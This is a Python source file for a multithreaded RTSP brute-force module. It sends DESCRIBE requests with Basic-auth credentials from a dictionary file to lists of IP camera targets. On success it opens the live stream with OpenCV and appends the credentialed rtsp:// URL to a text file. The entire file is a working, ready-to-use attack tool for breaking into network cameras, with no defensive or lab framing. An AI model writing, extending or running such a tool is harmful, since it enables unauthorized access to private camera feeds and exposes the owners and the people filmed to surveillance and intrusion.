import logging
import socket
import base64
import concurrent.futures
import itertools
import argparse
import time
import cv2
from queue import Queue
from common import cargar_datos, guardar_datos

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class RTSPBruteModule:
    def __init__(self):
        self.targets = []
        self.credentials = []
        self.pause_duration = 1
        self.max_threads = 50
        self.timeout = 5
        self.seen_urls = set()

    def setup(self, targets, dictionary_file, pause_duration=1, max_threads=50, timeout=5):
        self.targets = targets
        self.credentials = self.load_credentials(dictionary_file)
        self.pause_duration = pause_duration
        self.max_threads = max_threads
        self.timeout = timeout

    def load_credentials(self, dictionary_file):
        try:
            with open(dictionary_file, 'r') as f:
                return [line.strip() for line in f.readlines()]
        except FileNotFoundError:
            logging.error(f"Dictionary file {dictionary_file} not found.")
            return []

    def run(self):
        total_targets = len(self.targets)
        logging.info(f"[*] Total targets: {total_targets}")

        queue = Queue()

        # Add all combinations of targets and credentials to the queue
        for target in self.targets:
            for credential in self.credentials:
                queue.put((target, credential))

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            while not queue.empty():
                executor.submit(self.brute_force, queue.get())

        logging.info("[*] Finished all threads")

    def rtsp_request(self, target, credential):
        ip, port = target
        passwToBytes = credential.encode('ascii')
        passwToB64 = base64.b64encode(passwToBytes)
        passwF = passwToB64.decode('ascii')
        req = (
            f"DESCRIBE rtsp://{ip}:{port}/ RTSP/1.0\r\n"
            f"CSeq: 2\r\n"
            f"Authorization: Basic {passwF}\r\n\r\n"
        )
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((ip, int(port)))
            encodereq = req.encode('ascii')
            s.sendall(encodereq)
            data = s.recv(1024)
            response = data.decode('ascii')
            s.close()

            if "401 Unauthorized" not in response and "404 Not Found" not in response:
                #logging.info(f"Found credentials for {ip}:{port} - {credential}")
                url = f"rtsp://{credential}@{ip}:{port}/"
                return self.display_camera(url)
        except socket.error as e:
            pass
            #logging.error(f"Error connecting to {ip}:{port} - {e}")
        return False

    def display_camera(self, url):
        cap = cv2.VideoCapture(url, cv2.CAP_FFMPEG)
        if cap.isOpened():
            logging.info(f"Displaying camera stream from {url}")
            start_time = time.time()
            while time.time() - start_time < 10:
                ret, frame = cap.read()
                if not ret:
                    break
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    break
            cap.release()
            cv2.destroyAllWindows()
            self.save_url(url)  # Save the URL only if the stream is successfully displayed
            return True
        else:
            pass
            #logging.error(f"Failed to open video stream from {url}")
        return False

    def save_url(self, url):
        self.seen_urls.add(url)
        with open("RTSPCONECT.txt", "a") as file:
            file.write(f"{url}\n")

    def brute_force(self, task):
        target, credential = task
        ip, port = target
        if not self.rtsp_request(target, credential):
            pass
            #logging.info(f"Failed login for {ip}:{port} with {credential}")
        time.sleep(self.pause_duration)

